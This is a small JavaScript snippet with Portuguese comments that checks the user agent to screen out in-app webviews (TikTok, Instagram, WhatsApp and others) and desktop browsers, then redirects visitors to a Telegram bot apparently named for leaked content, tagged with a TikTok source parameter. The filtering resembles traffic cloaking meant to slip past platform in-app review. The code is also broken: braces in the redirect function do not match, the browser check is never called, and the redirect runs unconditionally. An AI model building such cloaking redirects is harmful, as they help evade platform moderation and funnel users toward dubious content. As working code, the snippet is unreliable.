<script>
  function isRealBrowser(ua) {
    // Lista de navegadores reais que a gente CONFIA pra redirecionar
    const browsers = ['chrome', 'firefox', 'safari', 'edg', 'opera', 'brave'];

    // Remover todos os que s√£o WebView ou apps embutidos
    const webViewIndicators = ['wv', 'fbav', 'fban', 'instagram', 'line', 'snapchat', 'pinterest', 'whatsapp', 'telegram', 'tiktok'];

    // Testa se √© mobile
    const isMobile = /mobi|android|iphone|ipad|ipod/i.test(ua);

    // Se conter qualquer indicativo de webview/app = BLOQUEIA
    for (let i = 0; i < webViewIndicators.length; i++) {
      if (ua.includes(webViewIndicators[i])) return false;
    }

    // Se n√£o for mobile, nem tenta
    if (!isMobile) return false;

    // Testa se o navegador est√° na lista de browser confi√°vel
    return browsers.some(browser => ua.includes(browser));
  }

  function checkRedirect() {
    const ua = navigator.userAgent.toLowerCase();

      window.location.replace("https://t.me/v4zad0s32_bot?start=Tiktok1");
    }
  }

  checkRedirect();
</script>
